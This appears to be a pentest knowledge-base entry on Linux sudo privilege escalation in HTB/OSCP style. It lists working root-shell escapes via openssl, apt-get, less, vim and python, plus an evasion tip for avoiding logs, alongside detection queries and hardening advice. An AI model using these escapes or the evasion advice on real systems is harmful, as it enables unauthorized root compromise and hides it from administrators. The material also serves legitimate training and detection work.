examples.label: Enumerate what you can run as sudo
GTFOBins-style openssl write to /etc/sudoers.d
examples.command: echo "htb-student ALL=(ALL) NOPASSWD:ALL" | base64 | sudo /usr/bin/openssl enc -d -a -out /etc/sudoers.d/htb-student

examples.label: OSCP Ch17 - apt-get GTFOBins escape: changelog spawns less, then shell
examples.command:
sudo apt-get changelog apt
# In the pager, type:
!/bin/sh

notes: sudo -l is the first thing to run on any box. A single NOPASSWD binary is usually enough - check it on GTFOBins. The openssl trick writes a NOPASSWD line into /etc/sudoers.d when openssl is sudo-allowed. OSCP Ch17: apt-get changelog opens less; type !/bin/sh inside less to escape to root shell. Always check GTFOBins for every binary in 'sudo -l'. AppArmor may block tcpdump sudo escape even when it's listed - check /var/log/syslog for apparmor=DENIED. Also covered in: OSCP PEN-200 Chapter 17 (Linux Privilege Escalation).

recommended.note: tcpdump postrotate is a classic sudo escape.
If env_keep+=LD_PRELOAD is set, preload a .so.
No useful entry? Try the Baron Samedit CVE.

name: Sudo Abuse - Enumerate and Exploit
description: List what you may run via sudo, then check GTFOBins for each entry. Many allowed binaries (tcpdump, openssl, vim, less, etc.) can be turned into a root shell or arbitrary file write.

defense.why_it_works: Many sudo entries allow running specific commands as root. GTFOBins documents how legitimate binaries (vim, find, less, python, awk, nmap, etc.) can be used to spawn shells when run with sudo. Even seemingly restricted sudo entries can be abused if the allowed binary has shell escape or command execution capabilities.
defense.prerequisites: Any sudo privilege (even for a single command). The allowed command has a GTFOBins-listed shell escape or command execution vector.
defense.impact: Root shell via sudo-privileged binary abuse. Enables full system compromise from a single misconfigured sudo entry.
defense.detection: Unusual use of sudo-allowed commands to spawn shell processes (sudo vim → :!bash). Auditd: bash/sh spawned as child of sudo-executed binary. SIEM: interactive shell spawned from normally batch-only processes.
defense.artifacts: Sudo log (/var/log/auth.log): sudo execution of allowed binary | Process tree: vim/find/python -> /bin/bash as root
defense.splunk_spl:
index=linux sourcetype="linux:auditd" ppid_comm="sudo" comm="*sh"
| where match(ppid_exe, "(?i)(vim|find|less|nmap|python|perl|awk)")
| table _time, host, auid, ppid_exe, comm
defense.elastic_kql: process.parent.name:(vim OR find OR less OR nmap OR python*) AND process.name:(bash OR sh) AND user.id:0
defense.sentinel_kql:
Syslog
| where SyslogMessage has "sudo" and SyslogMessage has_any ("vim","find","less","nmap","python","awk") and SyslogMessage has_any ("!bash","/bin/sh","os.system")
| project TimeGenerated, Computer, SyslogMessage
| sort by TimeGenerated desc
// GTFOBins shell escape from a sudo-allowed binary
defense.prevention: Review all sudo entries against GTFOBins. Avoid granting sudo access to any binary with shell escape capabilities unless absolutely necessary. Use 'NOEXEC' sudo flag to prevent command execution from within allowed binaries. Use strict sudo rules: specify exact command flags (e.g., /usr/bin/find /specific/path -type f) rather than unlimited arguments.
defense.misconfiguration: sudoers grants unrestricted access to binaries with GTFOBins shell escapes: 'htb-student ALL=(ALL) NOPASSWD: /usr/bin/vim' or 'ALL=(ALL) NOPASSWD: ALL'.
defense.vulnerable_config:
# Overly permissive sudo rules
htb-student ALL=(ALL) NOPASSWD: /usr/bin/vim
htb-student ALL=(ALL) NOPASSWD: /usr/bin/python3

# vim escape: sudo vim -c ':!/bin/bash'
# python escape: sudo python3 -c 'import os; os.system("/bin/bash")'
defense.secure_config:
# Restrict sudo to only necessary operations
# Use NOEXEC flag for editors
htb-student ALL=(ALL) NOEXEC: /usr/bin/vim /specific/config/file

# Avoid granting sudo to: vim, python, perl, ruby, awk, find, less, man, etc.
# Cross-reference all sudo entries against GTFOBins

# Run sudo audit:
sudo -l | grep -iE 'vim|python|perl|awk|find|less|nmap'
defense.evasion: Use the GTFOBins one-shot that spawns a shell without writing files; remove any dropped .so/binary; the sudo call is logged, so do it once and pivot rather than repeating.

steps.label: List what you can run as sudo
Abuse an allowed binary to get a root shell
steps.command: # e.g. sudo vim -c ':!/bin/sh'  |  sudo less /etc/profile then !/bin/sh

explain:
Lists sudo rights, then turns an allowed binary into root via GTFOBins:
  sudo -l                  show which commands you may run as root
Many binaries (vim, less, tcpdump, openssl, ...) have documented sudo escapes on GTFOBins - e.g. sudo vim -c ':!/bin/sh' gives a root shell. Look up each allowed binary there.
